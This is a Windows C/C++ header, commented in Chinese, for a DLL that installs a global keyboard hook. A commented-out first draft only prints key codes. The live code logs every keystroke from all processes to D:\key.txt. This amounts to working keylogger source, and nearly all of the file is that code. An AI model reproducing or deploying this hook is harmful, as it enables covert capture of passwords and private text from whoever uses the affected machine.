#ifndef _WDD_HOOK_H_ 
#define _WDD_HOOK_H_

//
//#define DLLEXP extern "C" __declspec(dllexport)
//#else
//#define DLLEXP extern "C"__declspec(dllimport)
//#endif
//
//#include <windows.h>
//#include <stdio.h>
//
////启动钩子函数
//DLLEXP int startHook(); 
//
////结束钩子函数
//DLLEXP int endHook();
//
//
////钩子函数
//DLLEXP LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wp,LPARAM lp);
//
//HINSTANCE hinstance;
//
//
//#pragma data_seg("wddpeakking")
//HHOOK keyHook = 0;
//#pragma data_seg()
//
//#pragma comment(linker,"/section:wddpeakking,RWS")
//
////启动钩子函数
//int startHook()
//{
//	printf("%d\n",123);
//	keyHook = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hinstance,0);
//	printf("%d\n",keyHook);
//	return 0;
//}
//
////结束钩子函数
//int endHook()
//{
//	UnhookWindowsHookEx(keyHook);
//	return 0;
//}
//
//
////钩子函数
//LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wp,LPARAM lp)
//{
//	printf("%d\n",nCode);
//	if (nCode>0)
//	{
//		printf("%d\n",(int)wp);
//	}
//	return  CallNextHookEx(keyHook,nCode,wp,lp);
//}
//
//BOOL WINAPI DllMain(HINSTANCE hinst,ULONG what,LPVOID id)
//{
//	switch (what)
//	{
//	case DLL_PROCESS_ATTACH: 
//		{
//			hinstance = hinst;
//			printf("%d\n",123456);
//		}
//		break;
//	case DLL_PROCESS_DETACH:
//		break;
//	case DLL_THREAD_ATTACH:
//		break;
//	case DLL_THREAD_DETACH:
//		break;
//	default:
//		break;
//	}
//	return TRUE;
//}

#include <windows.h>
#include "string.h"
#include "stdio.h" 

HINSTANCE hInst;
#pragma data_seg("hookdata")
HHOOK oldkeyhook=0;
#pragma data_seg()

#pragma comment(linker,"/SECTION:hookdata,RWS")

#define DllExport extern "C"__declspec(dllexport)

DllExport LRESULT CALLBACK KeyBoardProc(int nCode,WPARAM wParam, LPARAM lParam );
DllExport void startHook(int nCode,HANDLE hd);
DllExport void endHook(void);

BOOL WINAPI DllMain(HINSTANCE hInstance,ULONG What,LPVOID NotUsed)
{
	  switch(What)
	  {
	  case DLL_PROCESS_ATTACH:
		  hInst = hInstance;
		  break;
	  case DLL_PROCESS_DETACH:
		  break;
	  case DLL_THREAD_ATTACH:
		  break;
	  case DLL_THREAD_DETACH:
		  break; 

	  }
	  return 1;
 }

void startHook(int nCode,HANDLE hd)
{
	oldkeyhook = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyBoardProc,(HINSTANCE)hd,0);
}

DllExport LRESULT CALLBACK KeyBoardProc(int nCode,WPARAM wParam, LPARAM lParam )
{
	WPARAM j;
	FILE *fp;
	if(lParam&0x80000000)
	{
		j = wParam;
		fp=fopen("D:\\key.txt","a"); 
		fprintf(fp,"%c",j);
		fclose(fp);
	}
	return CallNextHookEx(oldkeyhook,nCode,wParam,lParam);
}
void endHook(void)
{
	UnhookWindowsHookEx(oldkeyhook);
}
#endif